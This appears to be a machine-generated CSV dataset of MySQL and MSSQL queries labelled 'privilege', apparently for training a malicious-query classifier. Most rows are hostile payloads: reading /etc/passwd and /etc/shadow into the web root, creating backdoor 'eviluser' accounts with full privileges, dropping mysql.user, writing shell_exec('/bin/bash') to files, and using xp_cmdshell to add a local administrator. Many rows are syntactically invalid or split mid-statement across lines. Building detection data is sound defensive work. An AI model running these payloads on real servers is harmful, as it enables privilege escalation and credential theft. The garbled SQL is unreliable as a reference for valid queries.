query,label,label_name,source
CREATE FUNCTION SLEEP SECOND (sec TINYINT) RETURNS INT DETERMINISTIC BEGIN SLEEP(sec); RETURN 0;END\; SELECT SLEEP(10);,3,privilege,generated_groq_mysql_simple
SET GLOBAL LOCAL INFILE = 1;,3,privilege,generated_groq_mysql_simple
SET GLOBAL MAX_ALLOWED_PACKET = 1024 * 1024 * 1024;,3,privilege,generated_groq_mysql_simple
SET GLOBAL net_write_timeout = 28800;,3,privilege,generated_groq_mysql_simple
SET GLOBAL net_read_timeout = 28800;,3,privilege,generated_groq_mysql_simple
SELECT * FROM xxe INTO OUTFILE '/etc/shadow' FROM xxe,3,privilege,generated_groq_mysql_simple
SET GLOBAL general_log = 1;,3,privilege,generated_groq_mysql_simple
SHOW PROCESSLIST; SET GLOBAL general_log = 0;,3,privilege,generated_groq_mysql_simple
GRANT LOAD DATA LOCAL INFILE ON *.* TO 'username'@%,3,privilege,generated_groq_mysql_simple
"CREATE TABLE xxe (id int, name varchar(255)); SELECT sleep(10)",3,privilege,generated_groq_mysql_simple
FLUSH PRIVILEGES; GRANT ALL PRIVILEGES ON *.* TO 'username'@'%',3,privilege,generated_groq_mysql_simple
ALTER USER 'root'@'%' IDENTIFIED BY 'password';,3,privilege,generated_groq_mysql_simple
GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost';,3,privilege,generated_groq_mysql_simple
CREATE USER 'user'@'localhost'@'localhost' IDENTIFIED BY 'password';,3,privilege,generated_groq_mysql_simple
CREATE USER ''@'localhost'@'localhost';,3,privilege,generated_groq_mysql_simple
SET PASSWORD FOR 'user'@'localhost' = PASSWORD('password');,3,privilege,generated_groq_mysql_simple
GRANT FILE ON *.* TO 'user'@'localhost';,3,privilege,generated_groq_mysql_simple
GRANT SELECT ON mysql.user TO 'user'@'localhost';,3,privilege,generated_groq_mysql_simple
GRANT FILE ON mysql.* TO 'user'@'localhost';,3,privilege,generated_groq_mysql_simple
LOAD DATA LOCAL INFILE '/path/to/file' INTO TABLE table; SELECT LOAD_FILE('/path/to/file');,3,privilege,generated_groq_mysql_simple
LOAD DATA LOCAL INFILE '/path/to/file' INTO TABLE table; CREATE FUNCTION f(...) RETURNS INTEGER DETERMINISTIC;,3,privilege,generated_groq_mysql_simple
CREATE FUNCTION f(...) RETURNS INTEGER DETERMINISTIC; DELIMITER //; CREATE FUNCTION f(...) RETURNS INTEGER DETERMINISTIC; DELIMITER ;,3,privilege,generated_groq_mysql_simple
DROP TABLE if exists f; CREATE FUNCTION f(...) RETURNS INTEGER DETERMINISTIC;,3,privilege,generated_groq_mysql_simple
"INSERT INTO mysql.user SET User='newuser', Host='localhost', Password=PASSWORD('password'), Privileges='ALL PRIVILEGES'",3,privilege,generated_groq_mysql_advanced
GRANT ALL ON *.* TO 'newuser'@'localhost' WITH GRANT OPTION,3,privilege,generated_groq_mysql_advanced
SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/var/www/html/passwd.txt',3,privilege,generated_groq_mysql_advanced
SELECT LOAD_FILE('/etc/shadow') INTO OUTFILE '/var/www/html/shadow.txt',3,privilege,generated_groq_mysql_advanced
CREATE FUNCTION my_func() RETURNS INTEGER BEGIN SELECT LOAD_FILE('/etc/passwd') INTO @x; RETURN 1; END;,3,privilege,generated_groq_mysql_advanced
CREATE PROCEDURE my_proc() BEGIN SELECT LOAD_FILE('/etc/passwd') INTO @x; END;,3,privilege,generated_groq_mysql_advanced
"CREATE TABLE new_table (a INT, b INT); INSERT INTO new_table VALUES (1, 1); DROP TABLE new_table",3,privilege,generated_groq_mysql_advanced
GRANT CREATE USER ON *.* TO 'newuser'@'localhost'; FLUSH PRIVILEGES; CREATE USER newuser@localhost IDENTIFIED BY 'password';,3,privilege,generated_groq_mysql_advanced
"SELECT * FROM (SELECT CONCAT(FILE_NAME, ' ', FILE_TYPE) AS name FROM information_schema.FILES WHERE FILE_NAME LIKE '/etc/%') AS t",3,privilege,generated_groq_mysql_advanced
CREATE FUNCTION my_udf() RETURNS VOID BEGIN SELECT * FROM information_schema.FILES WHERE FILE_NAME LIKE '/etc/%'; END;,3,privilege,generated_groq_mysql_advanced
SELECT * FROM INFORMATION_SCHEMA.FUNCTIONS WHERE ROUTINE_NAME LIKE '%mysql.%';,3,privilege,generated_groq_mysql_advanced
"CREATE VIEW new_view AS SELECT * FROM mysql.user WHERE User=CONCAT('newuser', '@', 'localhost');",3,privilege,generated_groq_mysql_advanced
"CREATE TABLE new_table (a INT); INSERT INTO new_table VALUES (1, 1); SELECT * FROM new_table AS t JOIN (SELECT * FROM new_table) AS s",3,privilege,generated_groq_mysql_advanced
SELECT * FROM (SELECT * FROM (SELECT * FROM mysql.user) AS x) AS y WHERE Privileges LIKE '%SUPER%';,3,privilege,generated_groq_mysql_advanced
CREATE FUNCTION my_udf() RETURNS VOID BEGIN SELECT LOAD_FILE('/etc/passwd') INTO @x; END;,3,privilege,generated_groq_mysql_advanced
SELECT * FROM (SELECT * FROM (SELECT * FROM mysql.user) AS x) AS y WHERE Host LIKE 'localhost';,3,privilege,generated_groq_mysql_advanced
CREATE FUNCTION my_udf() RETURNS INTEGER BEGIN SELECT * FROM information_schema.PLUGINS WHERE PLUGIN_NAME LIKE '%mysql.%'; END;,3,privilege,generated_groq_mysql_advanced
SELECT * FROM (SELECT * FROM (SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST) AS x) AS y WHERE INFO LIKE '/var/www/html%';,3,privilege,generated_groq_mysql_advanced
"CREATE TABLE new_table (a INT); INSERT INTO new_table VALUES (1, 1); DROP TABLE new_table; COMMIT; ROLLBACK;",3,privilege,generated_groq_mysql_advanced
SELECT * FROM mysql.user WHERE Host LIKE 'localhost' ORDER BY RAND() LIMIT 1,3,privilege,generated_groq_mysql_advanced
SELECT * FROM (SELECT * FROM INFORMATION_SCHEMA.QUERY_CACHE) AS t JOIN (SELECT * FROM INFORMATION_SCHEMA.QUERY_CACHE) AS s,3,privilege,generated_groq_mysql_advanced
"CREATE TABLE new_table (a INT); INSERT INTO new_table VALUES (1, 1); TRUNCATE TABLE new_table;",3,privilege,generated_groq_mysql_advanced
SET GLOBAL GENERAL_LOG = 'log.log'; FLUSH LOGS;,3,privilege,generated_groq_mysql_advanced
SELECT SLEEP(10); DROP TABLE test; SELECT * FROM (SELECT COUNT(*) FROM mysql.user) AS tmp;,3,privilege,generated_groq_mysql_advanced
SET GLOBAL innodb_max_dirty_pages_pct = 0; FLUSH TABLES;,3,privilege,generated_groq_mysql_advanced
SELECT 'UNION|ALL|SELECT|FROM|JOIN|WHERE|GROUP|HAVING|ORDER|LIMIT||';,3,privilege,generated_groq_mysql_advanced
CREATE TABLE test (name VARCHAR(255)); INSERT INTO test (name) VALUES ('1'); GRANT FILE ON *.* TO 'test'@'%' IDENTIFIED BY 'test';,3,privilege,generated_groq_mysql_advanced
GRANT ALL PRIVILEGES ON *.* TO 'test'@'%' IDENTIFIED BY 'test'; SET GLOBAL general_log = 'log.log'; FLUSH LOGS;,3,privilege,generated_groq_mysql_advanced
CREATE TABLE test (name VARCHAR(255)); INSERT INTO test (name) VALUES ('1'); SELECT 'UNION|ALL|SELECT|FROM|JOIN|WHERE|GROUP|HAVING|ORDER|LIMIT||';,3,privilege,generated_groq_mysql_advanced
SET GLOBAL general_log = 'log.log'; FLUSH LOGS; SELECT * FROM (SELECT SLEEP(10) FROM NULL) AS tmp;,3,privilege,generated_groq_mysql_advanced
"CREATE TABLE test (name VARCHAR(255)); INSERT INTO test (name) VALUES ('1'); GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,RELOAD,DROP,SYSTEM,FILE,REFERENCES,INDEX ON test.* TO 'test'@'localhost'@'%' IDENTIFIED BY 'test';",3,privilege,generated_groq_mysql_advanced
GRANT CREATE USER ON *.* TO 'test'@'%' IDENTIFIED BY 'test'; SET GLOBAL general_log = 'log.log'; FLUSH LOGS; SELECT * FROM (SELECT SLEEP(10) FROM NULL) AS tmp;,3,privilege,generated_groq_mysql_advanced
SET GLOBAL max_connections = 10000; SET GLOBAL max_allowed_packet = 1024 * 1024 * 1024; SET GLOBAL general_log = 'log.log'; FLUSH LOGS;,3,privilege,generated_groq_mysql_advanced
SELECT * FROM (SELECT SLEEP(10) FROM NULL) AS tmp; GRANT ALL PRIVILEGES ON *.* TO 'test'@'%' IDENTIFIED BY 'test'; SET GLOBAL general_log = 'log.log';,3,privilege,generated_groq_mysql_advanced
CREATE TABLE test (name VARCHAR(255)); INSERT INTO test (name) VALUES ('1'); SELECT 'SELECT|/proc/self/environ|/|/etc/passwd|';,3,privilege,generated_groq_mysql_advanced
"SET GLOBAL max_connections = 10000; SET GLOBAL max_allowed_packet = 1024 * 1024 * 1024; GRANT FILE ON *.* TO 'test'@'%' IDENTIFIED BY 'test'; SET GLOBAL general_log = 'log.log',
    ",3,privilege,generated_groq_mysql_advanced
CREATE USER 'test'@'%' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'test'@'%';,3,privilege,generated_groq_mysql_advanced
GRANT FILE ON *.* TO 'test'@'%'; LOAD DATA LOCAL INFILE /etc/passwd INTO OUTFILE /tmp/passwords.txt; SELECT * FROM mysql.user; UPDATE mysql.user SET plugin='' WHERE user='test';,3,privilege,generated_groq_mysql_advanced
"CREATE USER 'test'@'%' IDENTIFIED BY 'password'; GRANT CREATE VIEW, CREATE ROUTINE, EXECUTE, FILE, LOCK TABLES, PROCESS, RELOAD, SHUTDOWN, SHOW VIEW, TRIGGER ON *.* TO 'test'@'%';",3,privilege,generated_groq_mysql_advanced
"SET GLOBAL GENERAL_LOG = '/tmp/log'; SET GLOBAL GENERAL_LOG_FILE = '/tmp/log'; INSERT INTO mysql.user SET user = 'test', password = PASSWORD('password'); FLUSH PRIVILEGES;",3,privilege,generated_groq_mysql_advanced
SELECT * FROM mysql.user WHERE user = 'test' AND plugin = ''; UPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'test'; UPDATE mysql.user SET password = PASSWORD('password') WHERE user = 'test';,3,privilege,generated_groq_mysql_advanced
CREATE USER 'test'@'%' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON test.* TO 'test'@'%'; GRANT SELECT ON mysql.user TO 'test'@'%'; SHOW GRANTS FOR 'test'@'%';,3,privilege,generated_groq_mysql_advanced
LOAD DATA LOCAL INFILE /etc/passwd INTO OUTFILE /tmp/passwords.txt; CREATE FUNCTION f1 RETURNS INT DETERMINISTIC SONAME 'libmysqludf.so'; SELECT LOAD_FILE('/etc/passwd') INTO @var; CREATE TABLE test (id INT PRIMARY KEY);,3,privilege,generated_groq_mysql_advanced
CREATE TABLE test LIKE mysql.user; INSERT INTO test SELECT * FROM mysql.user; UPDATE test SET user = 'test'; UPDATE test SET password = PASSWORD('password');,3,privilege,generated_groq_mysql_advanced
"CREATE USER 'test'@'%' IDENTIFIED BY 'password'; SET GLOBAL general_log = '/tmp/log'; SET GLOBAL general_log_file = '/tmp/log'; INSERT INTO mysql.user SET user = 'test', password = PASSWORD('password');",3,privilege,generated_groq_mysql_advanced
CREATE TABLE test (id INT PRIMARY KEY); CREATE TABLE test2 AS SELECT * FROM test; CREATE USER 'test'@'%' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'test'@'%';,3,privilege,generated_groq_mysql_advanced
CREATE USER 'test'@'%' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'test'@'%'; CREATE TABLE test AS SELECT * FROM mysql.user; UPDATE mysql.user SET password = PASSWORD('password') WHERE user = 'test';,3,privilege,generated_groq_mysql_advanced
SET @var = 123; CREATE TABLE test (id INT PRIMARY KEY); TRUNCATE TABLE test; INSERT INTO test VALUES (@var);,3,privilege,generated_groq_mysql_advanced
CREATE TABLE test AS SELECT * FROM mysql.user; UPDATE test SET user = 'test'; UPDATE test SET password = PASSWORD('password'); UPDATE test SET host = '%';,3,privilege,generated_groq_mysql_advanced
CREATE USER 'test'@'%' IDENTIFIED BY 'password'; GRANT PROCESS ON *.* TO 'test'@'%'; SHOW PROCESSLIST; CREATE FUNCTION f1 RETURNS INT DETERMINISTIC SONAME 'libmysqludf.so';,3,privilege,generated_groq_mysql_advanced
LOAD DATA LOCAL INFILE /etc/passwd INTO OUTFILE /tmp/passwords.txt; CREATE TABLE test (id INT PRIMARY KEY); ALTER TABLE test ADD COLUMN host VARBINARY(255) AFTER id;,3,privilege,generated_groq_mysql_advanced
CREATE FUNCTION f1 RETURNS INT DETERMINISTIC SONAME 'libmysqludf.so'; CREATE TABLE test (id INT PRIMARY KEY); CREATE TABLE test2 AS SELECT * FROM test; CREATE USER 'test'@'%' IDENTIFIED BY 'password';,3,privilege,generated_groq_mysql_advanced
CREATE TABLE test LIKE mysql.user; INSERT INTO test SELECT * FROM mysql.user; UPDATE test SET user = 'test'; UPDATE test SET password = PASSWORD('password'); ALTER TABLE test ADD COLUMN host VARBINARY(255) AFTER id;,3,privilege,generated_groq_mysql_advanced
GRANT EXECUTE ON FUNCTION mysql.UDF_sys_gethostname TO 'test'@'%'; SELECT LOAD_FILE('/etc/passwd') INTO @var; CREATE TABLE test (id INT PRIMARY KEY); INSERT INTO test VALUES (@var);,3,privilege,generated_groq_mysql_advanced
CREATE USER 'test'@'%' IDENTIFIED BY 'password'; GRANT FILE ON *.* TO 'test'@'%'; LOAD DATA LOCAL INFILE /etc/passwd INTO OUTFILE /tmp/passwords.txt; SELECT @var := LOAD_FILE('/etc/passwd') INTO @var;,3,privilege,generated_groq_mysql_advanced
CREATE USER 'eviluser'@'%' IDENTIFIED BY 'evilpass';GRANT ALL PRIVILEGES ON *.* TO 'eviluser'@'%';,3,privilege,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(schema_name) INTO OUTFILE '/var/www/html/exploit.php' FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql');",3,privilege,generated_groq_mysql_advanced
"CREATE USER 'eviluser'@'%' IDENTIFIED BY 'evilpass';GRANT FILE ON *.* TO 'eviluser'@'%';CREATE DEFINER=`eviluser`@'%' FUNCTION `execute_query`(sql VARCHAR(255)) RETURNS INT DETERMINISTIC BEGIN DECLARE result INT; PREPARE stmt FROM CONCAT('SELECT ', sql, ' INTO @result FROM DUAL'); SET result = (EXECUTE stmt); DEALLOCATE PREPARE stmt; RETURN result; END;",3,privilege,generated_groq_mysql_advanced
SELECT GROUP_CONCAT(privilege) INTO @privileges FROM mysql.user WHERE user='eviluser';,3,privilege,generated_groq_mysql_advanced
"CREATE USER 'eviluser'@'%' IDENTIFIED BY 'evilpass';GRANT PROCESS ON *.* TO 'eviluser'@'%';CREATE DEFINER=`eviluser`@'%' FUNCTION `upload_file`(filename VARCHAR(255), filecontents LONGBLOB) RETURNS INT DETERMINISTIC BEGIN LOAD DATA LOCAL INFILE '/var/www/html/uploadfile.php' INTO TABLE filename SET FILE_NAME = filename, FILE_CONTENTS = filecontents; RETURN 1; END;",3,privilege,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(table_name) INTO @tables FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql');",3,privilege,generated_groq_mysql_advanced
CREATE USER 'eviluser'@'%' IDENTIFIED BY 'evilpass';GRANT ALL PRIVILEGES ON database.* TO 'eviluser'@'%';,3,privilege,generated_groq_mysql_advanced
"CREATE DEFINER=`eviluser`@'%' FUNCTION `read_file`(filename VARCHAR(255)) RETURNS LONGBLOB DETERMINISTIC BEGIN DECLARE file_contents LONGBLOB; SET file_contents = UNHEX(SUBSTRING_INDEX(LAST_VALUE(LOAD_FILE(filename)),0,1)); RETURN file_contents; END;",3,privilege,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(event) INTO @events FROM INFORMATION_SCHEMA.EVENTS WHERE EVENT_SCHEMA NOT IN ('information_schema','mysql');",3,privilege,generated_groq_mysql_advanced
CREATE USER 'eviluser'@'%' IDENTIFIED BY 'eviluser';GRANT FILE ON *.* TO 'eviluser'@'%';,3,privilege,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(COLUMN_NAME) INTO @columns FROM information_schema.columns WHERE TABLE_SCHEMA NOT IN ('information_schema','mysql');",3,privilege,generated_groq_mysql_advanced
"CREATE DEFINER=`eviluser`@'%' FUNCTION `write_file`(filename VARCHAR(255), contents LONGBLOB) RETURNS INT DETERMINISTIC BEGIN LOAD DATA LOCAL INFILE '/var/www/html/uploadfile.php' INTO TABLE filename SET FILE_NAME = filename, FILE_CONTENTS = contents; RETURN LOAD_FILE(filename); END;",3,privilege,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(user) INTO @users FROM mysql.user WHERE Host NOT IN ('localhost','127.0.0.1', '::1');",3,privilege,generated_groq_mysql_advanced
CREATE USER 'eviluser'@'%' IDENTIFIED BY 'eviluser';,3,privilege,generated_groq_mysql_advanced
CREATE DEFINER=`eviluser`@'%' FUNCTION `execute_process`(cmd VARCHAR(255)) RETURNS INT DETERMINISTIC BEGIN DECLARE result INT; PREPARE stmt FROM 'SELECT * FROM DUAL WHERE (SELECT (CASE WHEN (SELECT * FROM (SELECT SLEEP(1)) AS t) ELSE 1 END)) = (SELECT ( CASE WHEN (1=1 OR LOAD_FILE(,3,privilege,generated_groq_mysql_advanced
)) ELSE 1 END))'; EXECUTE stmt; DECLARE EXIT HANDLER FOR SQLEXCEPTION BEGIN END; SET result = (EXECUTE stmt); DEALLOCATE PREPARE stmt; RETURN result; END;,3,privilege,generated_groq_mysql_advanced
SELECT GROUP_CONCAT(table_name) INTO @tables FROM information_schema.tables WHERE table_schema = 'mysql';,3,privilege,generated_groq_mysql_advanced
"CREATE DEFINER=`eviluser`@'%' FUNCTION `remote_file_read`(filename VARCHAR(255)) RETURNS LONGBLOB DETERMINISTIC BEGIN SET @sql = CONCAT('SELECT *', filename); PREPARE stmt FROM @sql; EXECUTE stmt; DEALLOCATE PREPARE stmt; END;",3,privilege,generated_groq_mysql_advanced
CREATE USER 'eviluser'@'%' IDENTIFIED BY 'eviluser';GRANT PROCESS ON *.* TO 'eviluser'@'%';,3,privilege,generated_groq_mysql_advanced
CREATE DEFINER=`eviluser`@'%' FUNCTION `read_file_contents`(filename VARCHAR(255)) RETURNS LONGBLOB DETERMINISTIC BEGIN SET @tmp = LOAD_FILE(filename); SET @sql = CONCAT('SELECT @tmp INTO OUTFILE ,3,privilege,generated_groq_mysql_advanced
'); PREPARE stmt FROM @sql; EXECUTE stmt; DEALLOCATE PREPARE stmt; RETURN LOAD_FILE(,3,privilege,generated_groq_mysql_advanced
); END;,3,privilege,generated_groq_mysql_advanced
CREATE DEFINER=`eviluser`@'%' FUNCTION `upload_file_contents`(filecontents LONGBLOB) RETURNS INT DETERMINISTIC BEGIN LOAD DATA LOCAL INFILE '/var/www/html/uploadfile.php' INTO TABLE filecontents; RETURN LOAD_FILE(,3,privilege,generated_groq_mysql_advanced
GRANT CREATE USER ON \*.* TO 'eviluser'@'%' IDENTIFIED BY 'password',3,privilege,generated_groq_mysql_advanced
UPDATE mysql.user SET Host = '192.168.1.1' WHERE User = 'root' AND Host = '127.0.0.1',3,privilege,generated_groq_mysql_advanced
SET SQL_SAFE_UPDATES = 0; GRANT FILE ON \*.* TO 'eviluser'@'%',3,privilege,generated_groq_mysql_advanced
CREATE USER 'eviluser'@'%' IDENTIFIED BY 'password'; GRANT SELECT ON information_schema.processlist TO 'eviluser'@'%',3,privilege,generated_groq_mysql_advanced
CREATE USER 'eviluser'@'%' IDENTIFIED BY 'password'; GRANT FILE ON \*.* TO 'eviluser'@'%'; DROP TABLE mysql.user WHERE User != 'root';,3,privilege,generated_groq_mysql_advanced
SET GLOBAL general_log = 'ON'; CREATE TABLE log LIKE mysql.general_log; GRANT FILE ON \*.* TO 'eviluser'@'%';,3,privilege,generated_groq_mysql_advanced
"(SELECT '*', 'shell_exec(\\\""/bin/bash\\\"")' FROM (SELECT 1)a FROM mysql.user WHERE Host = '127.0.0.1') INTO OUTFILE '/var/lib/mysql/mysql.sock'",3,privilege,generated_groq_mysql_advanced
"(SELECT 1 FROM (SELECT '*', 'shell_exec(\\\""/bin/bash\\\"")' FROM (SELECT 1)a FROM mysql.user WHERE Host = '127.0.0.1')b WHERE 1 IN (SELECT COUNT(*) FROM mysql.user WHERE Host = '127.0.0.1')) INTO OUTFILE '/var/lib/mysql/mysql.sock'",3,privilege,generated_groq_mysql_advanced
"SELECT \* FROM (SELECT 1)b WHERE 1 IN (SELECT COUNT(\*) FROM (SELECT 1 FROM (SELECT '*','shell_exec(\\\""/bin/bash\\\"")' FROM (SELECT 1)a FROM mysql.user WHERE Host = '127.0.0.1')c WHERE 1 IN (SELECT COUNT(\*) FROM mysql.user WHERE Host = '127.0.0.1'))d WHERE 1 IN (SELECT COUNT(\*) FROM mysql.user WHERE Host = '127.0.0.1'))e INTO OUTFILE '/var/lib/mysql/mysql.sock'",3,privilege,generated_groq_mysql_advanced
"WITH RECURSIVE evil AS (SELECT 1 UNION ALL SELECT 1 FROM evil) SELECT \* FROM (SELECT shell_exec(\\\""/bin/bash\\\"") FROM (SELECT 1)a FROM (SELECT 1)b FROM evil WHERE 1 IN (SELECT COUNT(*) FROM mysql.user WHERE Host = '127.0.0.1')) WHERE 1 IN (SELECT COUNT(*) FROM mysql.user WHERE Host = '127.0.0.1') INTO OUTFILE '/var/lib/mysql/mysql.sock'",3,privilege,generated_groq_mysql_advanced
"EXEC xp_cmdshell 'powershell -ep bypass',
  ",3,privilege,generated_groq_mssql_simple
"EXEC master..xpcmdshell 'notepad',
  ",3,privilege,generated_groq_mssql_simple
"EXEC sp_addlinkedserver 'myserver',
  ",3,privilege,generated_groq_mssql_simple
"EXEC sp_addsrvrolemember 'myuser', 'sysadmin',
  ",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_dirtree 'c:\\windows\\System32\\cmd.exe',
  ",3,privilege,generated_groq_mssql_simple
"EXEC sp_reset_server 'myserver',
  ",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_dirtree 'c:\\mydirectory',
  ",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'net localgroup administrators admin /add',
  ",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_enumdsn,
  ",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_dirtree 'c:\\windows\\',
  ",3,privilege,generated_groq_mssql_simple
Get-Location,3,privilege,generated_groq_mssql_simple
EXEC xp_cmdshell 'dir',3,privilege,generated_groq_mssql_simple
"EXEC sp_addsrvrolemember 'sa', 'sysadmin'",3,privilege,generated_groq_mssql_simple
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server',3,privilege,generated_groq_mssql_simple
"OPENROWSET ('MSDASQL', 'DRIVER={Microsoft ODBC Driver};SERVER=192.168.1.100', 'SELECT * FROM table')",3,privilege,generated_groq_mssql_simple
CREATE LINKED SERVER LinkedServer TO '192.168.1.100',3,privilege,generated_groq_mssql_simple
EXECUTE AS LOGIN = 'domain\\user',3,privilege,generated_groq_mssql_simple
